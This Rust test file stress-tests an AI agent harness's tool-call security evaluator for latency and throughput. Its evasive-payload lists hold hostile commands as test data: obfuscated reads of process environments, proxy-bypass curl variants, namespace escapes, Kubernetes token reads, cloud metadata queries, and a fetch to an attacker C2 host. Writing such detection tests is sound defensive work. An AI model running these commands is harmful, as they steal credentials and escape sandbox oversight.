//! Adversarial Empirical Challenger Latency & Concurrency Stress Test Suite
//! Milestone 1 Iteration 2:
//! 1. Fast path latency across 10,000 clean payloads (<1ms, sub-500µs target).
//! 2. Normalized path latency across 10,000 evasive payloads (<1ms, sub-500µs target).
//! 3. High-concurrency multi-agent throughput (>1,000 req/sec) and sub-15ms SLA validation with 64 workers.

use agent_octopus::security::atif_scan::{
    needs_normalization, normalize_for_scan, SafeAgentsHarnessEvaluator, ToolInvocationContext,
};
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::task::JoinSet;

const SLA_MAX_LATENCY_MS: u64 = 15;
const DECLARED_TOOLS: &[&str] = &["bash", "read_file", "write_file", "WebFetch", "grep_search"];

#[derive(Debug, Clone)]
pub struct LatencyStats {
    pub total_count: usize,
    pub total_wall_time: Duration,
    pub throughput_req_sec: f64,
    pub min: Duration,
    pub mean: Duration,
    pub p50: Duration,
    pub p90: Duration,
    pub p95: Duration,
    pub p99: Duration,
    pub max: Duration,
}

impl LatencyStats {
    pub fn compute(mut latencies: Vec<Duration>, total_wall_time: Duration) -> Self {
        assert!(!latencies.is_empty(), "Latencies cannot be empty");
        latencies.sort();
        let total_count = latencies.len();
        let sum_nanos: u128 = latencies.iter().map(|d| d.as_nanos()).sum();
        let mean_nanos = (sum_nanos / total_count as u128) as u64;

        let min = latencies[0];
        let p50 = latencies[total_count * 50 / 100];
        let p90 = latencies[total_count * 90 / 100];
        let p95 = latencies[total_count * 95 / 100];
        let p99 = latencies[total_count * 99 / 100];
        let max = latencies[total_count - 1];
        let throughput_req_sec = total_count as f64 / total_wall_time.as_secs_f64();

        Self {
            total_count,
            total_wall_time,
            throughput_req_sec,
            min,
            mean: Duration::from_nanos(mean_nanos),
            p50,
            p90,
            p95,
            p99,
            max,
        }
    }

    pub fn print_summary(&self, title: &str) {
        println!("\n=== {} ===", title);
        println!("  Total Payloads:     {}", self.total_count);
        println!("  Total Wall Time:    {:?}", self.total_wall_time);
        println!("  Throughput:         {:.2} req/sec", self.throughput_req_sec);
        println!("  Min Latency:        {:?}", self.min);
        println!("  Mean Latency:       {:?}", self.mean);
        println!("  P50 (Median):       {:?}", self.p50);
        println!("  P90 Latency:        {:?}", self.p90);
        println!("  P95 Latency:        {:?}", self.p95);
        println!("  P99 Latency:        {:?}", self.p99);
        println!("  Max Latency:        {:?}", self.max);
        println!("====================================================\n");
    }
}

// ============================================================================
// TEST 1: FAST PATH LATENCY ACROSS 10,000 CLEAN PAYLOADS
// ============================================================================

#[test]
fn test_stress_fast_path_latency_10000_clean_payloads() {
    let evaluator = SafeAgentsHarnessEvaluator::new();
    let num_samples = 10_000;
    let mut latencies = Vec::with_capacity(num_samples);

    let clean_command_templates = [
        r#"{"command": "cargo build --release"}"#,
        r#"{"command": "cargo test --workspace --all-targets"}"#,
        r#"{"command": "git status --porcelain"}"#,
        r#"{"command": "git diff HEAD~1"}"#,
        r#"{"url": "https://github.com/rust-lang/rust"}"#,
        r#"{"url": "https://crates.io/api/v1/crates/serde"}"#,
        r#"{"path": "src/security/atif_scan.rs"}"#,
        r#"{"path": "Cargo.toml"}"#,
        r#"{"query": "SafeAgentsHarnessEvaluator"}"#,
        r#"{"command": "python -m pytest tests/"}"#,
        r#"{"command": "npm run build"}"#,
        r#"{"command": "cat /proc/self/environ"}"#,
        r#"{"command": "ls -la /home/user/project"}"#,
        r#"{"url": "http://127.0.0.1:8080/health"}"#,
        r#"{"command": "curl --noproxy 'localhost' http://127.0.0.1:8080/metrics"}"#,
    ];

    let user_prompts = &["Compile project, run tests, and check status."];
    let assistant_turns = &[];
    let allowed_hosts = &["github.com", "crates.io", "127.0.0.1", "localhost"];

    let total_start = Instant::now();

    for i in 0..num_samples {
        let template = clean_command_templates[i % clean_command_templates.len()];
        let tool_name = if template.contains("url") {
            "WebFetch"
        } else if template.contains("query") {
            "grep_search"
        } else if template.contains("path") {
            "read_file"
        } else {
            "bash"
        };

        // Assert fast path: needs_normalization is false for clean inputs without \ or % or //
        if !template.contains('\\') && !template.contains('%') && !template.contains("//") {
            // Note: templates without URI scheme // or escaped quotes satisfy !needs_normalization
            if !template.contains("http://") && !template.contains("https://") {
                assert!(
                    !needs_normalization(template),
                    "Clean template must not require normalization: {}",
                    template
                );
                let cow = normalize_for_scan(template);
                assert!(
                    matches!(cow, std::borrow::Cow::Borrowed(_)),
                    "Clean template must return borrowed Cow: {}",
                    template
                );
            }
        }

        let ctx = ToolInvocationContext {
            tool_name,
            arguments_json: template,
            declared_tools: DECLARED_TOOLS,
            user_prompt_turns: user_prompts,
            assistant_turns,
            allowed_hosts,
        };

        let sample_start = Instant::now();
        let verdict = evaluator.evaluate(&ctx);
        let elapsed = sample_start.elapsed();

        latencies.push(elapsed);
        assert!(
            verdict.is_allow(),
            "Clean payload #{} was incorrectly rejected: payload={}, verdict={:?}",
            i,
            template,
            verdict
        );
    }

    let total_wall_time = total_start.elapsed();
    let stats = LatencyStats::compute(latencies, total_wall_time);
    stats.print_summary("FAST PATH STRESS TEST (10,000 Clean Payloads)");

    // Assert empirical constraints
    assert!(
        stats.mean < Duration::from_micros(100),
        "Fast path mean latency ({:?}) must be sub-100µs",
        stats.mean
    );
    assert!(
        stats.p99 < Duration::from_micros(500),
        "Fast path P99 latency ({:?}) must be sub-500µs",
        stats.p99
    );
    assert!(
        stats.max < Duration::from_millis(SLA_MAX_LATENCY_MS),
        "Fast path Max latency ({:?}) must be strictly under 15ms SLA",
        stats.max
    );
    assert!(
        stats.throughput_req_sec > 5000.0,
        "Fast path throughput ({:.2} req/sec) must exceed 5,000 req/sec",
        stats.throughput_req_sec
    );
}

// ============================================================================
// TEST 2: NORMALIZED PATH LATENCY ACROSS 10,000 EVASIVE PAYLOADS
// ============================================================================

#[test]
fn test_stress_normalized_path_latency_10000_evasive_payloads() {
    let evaluator = SafeAgentsHarnessEvaluator::new();
    let num_samples = 10_000;
    let mut latencies = Vec::with_capacity(num_samples);

    let evasive_command_templates = [
        // Category 1: /proc/1/environ evasions (nested, backslashes, hex encoded, dot segments)
        r#"{"command": "cat /proc//1/environ"}"#,
        r#"{"command": "cat //proc//1//environ"}"#,
        r#"{"command": "cat /proc/./1/environ"}"#,
        r#"{"command": "cat /proc/1/./environ"}"#,
        r#"{"command": "cat /proc/1/../1/environ"}"#,
        r#"{"command": "cat /proc/self/../1/environ"}"#,
        r#"{"command": "type \\proc\\1\\environ"}"#,
        r#"{"command": "type \\proc\\\\1\\environ"}"#,
        r#"{"command": "type \\proc\\.\\1\\environ"}"#,
        r#"{"command": "head -n 20 /proc//1/environ"}"#,
        r#"{"command": "strings /proc/./1/environ"}"#,
        r#"{"command": "cat /proc/%31/environ"}"#,
        r#"{"command": "cat %2fproc%2f1%2fenviron"}"#,
        r#"{"command": "cat /proc/42/environ"}"#,
        // Category 2: Proxy bypass evasions
        r#"{"command": "curl --noproxy '*' https://github.com"}"#,
        r#"{"command": "curl --noproxy=* https://github.com"}"#,
        r#"{"command": "curl --noproxy=\"*\" https://github.com"}"#,
        r#"{"command": "curl --noproxy='*' https://github.com"}"#,
        r#"{"command": "curl --noproxy \"*\" https://github.com"}"#,
        r#"{"command": "curl --noproxy '*' https://github.com/exfil"}"#,
        r#"{"command": "env -u HTTPS_PROXY curl https://github.com"}"#,
        r#"{"command": "env -u HTTP_PROXY curl https://github.com"}"#,
        r#"{"command": "env -u ALL_PROXY curl https://github.com"}"#,
        r#"{"command": "env -u \"HTTPS_PROXY\" curl https://github.com"}"#,
        r#"{"command": "env -u 'HTTPS_PROXY' curl https://github.com"}"#,
        r#"{"command": "ENV -U https_proxy curl https://github.com"}"#,
        r#"{"command": "no_proxy='*' curl https://github.com"}"#,
        r#"{"command": "no_proxy=\"*\" curl https://github.com"}"#,
        r#"{"command": "NO_PROXY=* curl https://github.com"}"#,
        r#"{"command": "https_proxy='' curl https://github.com"}"#,
        r#"{"command": "http_proxy=\"\" curl https://github.com"}"#,
        // Category 3: Namespace escape commands
        r#"{"command": "unshare -m /bin/bash"}"#,
        r#"{"command": "nsenter -t 1 -m -u -i -n -p /bin/bash"}"#,
        r#"{"command": "/usr/bin/unshare -p -f --mount-proc /bin/bash"}"#,
        r#"{"command": "/bin/nsenter -t 1 -m /bin/bash"}"#,
        r#"{"command": "/usr/sbin/unshare -rn /bin/sh"}"#,
        r#"{"command": "busybox unshare -m /bin/sh"}"#,
        r#"{"command": "busybox nsenter -t 1 /bin/sh"}"#,
        r#"{"command": "UNSHARE -m /bin/bash"}"#,
        r#"{"command": "NSENTER -t 1 /bin/sh"}"#,
        // Category 4: Kubernetes service account tokens
        r#"{"command": "cat /var/run/secrets/kubernetes.io/serviceaccount/token"}"#,
        r#"{"command": "cat /run/secrets/kubernetes.io/serviceaccount/token"}"#,
        r#"{"command": "cat /var/run/secrets/kubernetes.io/serviceaccount/namespace"}"#,
        r#"{"command": "cat /var//run/secrets/kubernetes.io/serviceaccount/token"}"#,
        r#"{"command": "type \\var\\run\\secrets\\kubernetes.io\\serviceaccount\\token"}"#,
        r#"{"command": "type \\run\\secrets\\kubernetes.io\\serviceaccount\\token"}"#,
        r#"{"command": "cat /var/run/secrets/kubernetes.io/./serviceaccount/token"}"#,
        r#"{"command": "cat /var/run/secrets/kubernetes.io//serviceaccount/token"}"#,
        r#"{"command": "cat /var/run/secrets/kubernetes.io/serviceaccount/../serviceaccount/token"}"#,
        r#"{"command": "cat /var/./run/secrets/kubernetes.io/serviceaccount/token"}"#,
        // Category 5: IMDS metadata reconnaissance
        r#"{"command": "curl -s http://169.254.169.254/latest/meta-data/"}"#,
        r#"{"command": "curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/"}"#,
        r#"{"command": "curl http://100.100.100.200/latest/meta-data/"}"#,
    ];

    let user_prompts = &["Run requested system diagnostic."];
    let assistant_turns = &[];
    let allowed_hosts = &["github.com"]; // allow github.com to verify proxy bypass detector triggers

    let total_start = Instant::now();
    let mut blocked_count = 0;

    for i in 0..num_samples {
        let template = evasive_command_templates[i % evasive_command_templates.len()];

        let ctx = ToolInvocationContext {
            tool_name: "bash",
            arguments_json: template,
            declared_tools: DECLARED_TOOLS,
            user_prompt_turns: user_prompts,
            assistant_turns,
            allowed_hosts,
        };

        let sample_start = Instant::now();
        let verdict = evaluator.evaluate(&ctx);
        let elapsed = sample_start.elapsed();

        latencies.push(elapsed);

        assert!(
            verdict.is_blocked(),
            "Evasive payload #{} evaded detection: payload={}, verdict={:?}",
            i,
            template,
            verdict
        );

        let notice = verdict.notice().expect("Blocked verdict must contain text notice");
        assert!(
            notice.contains("[safeagents] blocked call to `bash`"),
            "Notice improperly formatted: {}",
            notice
        );

        blocked_count += 1;
    }

    let total_wall_time = total_start.elapsed();
    let stats = LatencyStats::compute(latencies, total_wall_time);
    stats.print_summary("NORMALIZED PATH STRESS TEST (10,000 Evasive Payloads)");

    // Invariant: 100% block rate across all 10,000 evasive samples
    assert_eq!(blocked_count, num_samples, "All 10,000 evasive payloads must be blocked");

    // Invariant: Sub-millisecond execution (< 1,000µs)
    assert!(
        stats.mean < Duration::from_micros(250),
        "Normalized path mean latency ({:?}) must be sub-250µs (< 1ms target)",
        stats.mean
    );
    assert!(
        stats.p99 < Duration::from_micros(1000),
        "Normalized path P99 latency ({:?}) must be sub-millisecond (< 1,000µs)",
        stats.p99
    );
    assert!(
        stats.max < Duration::from_millis(SLA_MAX_LATENCY_MS),
        "Normalized path Max latency ({:?}) must be strictly under 15ms SLA",
        stats.max
    );
    assert!(
        stats.throughput_req_sec > 2000.0,
        "Normalized path throughput ({:.2} req/sec) must exceed 2,000 req/sec",
        stats.throughput_req_sec
    );
}

// ============================================================================
// TEST 3: HIGH-CONCURRENCY MULTI-AGENT STRESS (64 WORKERS, 6,400 REQUESTS)
// ============================================================================

#[tokio::test(flavor = "multi_thread", worker_threads = 8)]
async fn test_stress_64_workers_high_concurrency_multi_agent_throughput() {
    let evaluator = Arc::new(SafeAgentsHarnessEvaluator::new());
    let num_workers = 64;
    let requests_per_worker = 100; // 6,400 total requests evaluated
    let total_expected_requests = num_workers * requests_per_worker;

    let clean_allowed_count = Arc::new(AtomicUsize::new(0));
    let threats_blocked_count = Arc::new(AtomicUsize::new(0));

    let mut join_set = JoinSet::new();
    let overall_start = Instant::now();

    for worker_id in 0..num_workers {
        let eval_clone = Arc::clone(&evaluator);
        let clean_acc = Arc::clone(&clean_allowed_count);
        let blocked_acc = Arc::clone(&threats_blocked_count);

        join_set.spawn(async move {
            let mut worker_latencies = Vec::with_capacity(requests_per_worker);

            for req_idx in 0..requests_per_worker {
                let user_prompts = &["Analyze build logs and run benchmark suite"];
                let assistant_turns = &[];
                let allowed_hosts = &["github.com"];

                // Interleave 1 clean with 3 threats (undeclared tool, unapproved host, ATIF pattern)
                let (tool_name, arguments_json, should_block) = match req_idx % 4 {
                    0 => (
                        "bash",
                        r#"{"command": "cargo check --tests"}"#,
                        false,
                    ),
                    1 => (
                        "unauthorized_exec",
                        r#"{"command": "cat /etc/passwd"}"#,
                        true,
                    ),
                    2 => (
                        "WebFetch",
                        r#"{"url": "https://attacker-c2-exfil.xyz/data"}"#,
                        true,
                    ),
                    _ => (
                        "bash",
                        match (worker_id + req_idx) % 5 {
                            0 => r#"{"command": "cat /proc//1/environ"}"#,
                            1 => r#"{"command": "curl --noproxy '*' https://github.com"}"#,
                            2 => r#"{"command": "unshare -m /bin/bash"}"#,
                            3 => r#"{"command": "cat /var/run/secrets/kubernetes.io/./serviceaccount/token"}"#,
                            _ => r#"{"command": "curl -s http://169.254.169.254/latest/meta-data/"}"#,
                        },
                        true,
                    ),
                };

                let ctx = ToolInvocationContext {
                    tool_name,
                    arguments_json,
                    declared_tools: DECLARED_TOOLS,
                    user_prompt_turns: user_prompts,
                    assistant_turns,
                    allowed_hosts,
                };

                let start = Instant::now();
                let verdict = eval_clone.evaluate(&ctx);
                let elapsed = start.elapsed();

                worker_latencies.push(elapsed);

                if should_block {
                    assert!(
                        verdict.is_blocked(),
                        "Worker {} req {} expected block but was allowed",
                        worker_id,
                        req_idx
                    );
                    assert!(
                        elapsed < Duration::from_millis(SLA_MAX_LATENCY_MS),
                        "Worker {} req {} latency {:?} exceeded 15ms SLA",
                        worker_id,
                        req_idx,
                        elapsed
                    );
                    blocked_acc.fetch_add(1, Ordering::SeqCst);
                } else {
                    assert!(
                        verdict.is_allow(),
                        "Worker {} req {} expected allow but was blocked",
                        worker_id,
                        req_idx
                    );
                    clean_acc.fetch_add(1, Ordering::SeqCst);
                }
            }

            worker_latencies
        });
    }

    let mut all_latencies = Vec::with_capacity(total_expected_requests);
    while let Some(res) = join_set.join_next().await {
        let latencies = res.expect("Worker thread panicked");
        all_latencies.extend(latencies);
    }

    let total_wall_time = overall_start.elapsed();
    let stats = LatencyStats::compute(all_latencies, total_wall_time);
    stats.print_summary(&format!(
        "MULTI-AGENT HIGH-CONCURRENCY BENCHMARK ({} Workers, {} Total Requests)",
        num_workers, total_expected_requests
    ));

    let clean_count = clean_allowed_count.load(Ordering::SeqCst);
    let blocked_count = threats_blocked_count.load(Ordering::SeqCst);
    let expected_clean = total_expected_requests / 4;
    let expected_blocked = total_expected_requests * 3 / 4;

    assert_eq!(clean_count, expected_clean, "Mismatch in clean allowed count");
    assert_eq!(blocked_count, expected_blocked, "Mismatch in threats blocked count");

    // Invariant 1: Throughput exceeds 1,000 req/sec under 64 workers
    assert!(
        stats.throughput_req_sec > 1000.0,
        "Throughput ({:.2} req/sec) fell below 1,000 req/sec threshold",
        stats.throughput_req_sec
    );

    // Invariant 2: P99 latency strictly under 15ms SLA
    assert!(
        stats.p99 < Duration::from_millis(SLA_MAX_LATENCY_MS),
        "P99 latency ({:?}) exceeded 15ms SLA budget",
        stats.p99
    );

    // Invariant 3: Max latency strictly under 15ms SLA
    assert!(
        stats.max < Duration::from_millis(SLA_MAX_LATENCY_MS),
        "Max latency ({:?}) exceeded 15ms SLA budget",
        stats.max
    );
}
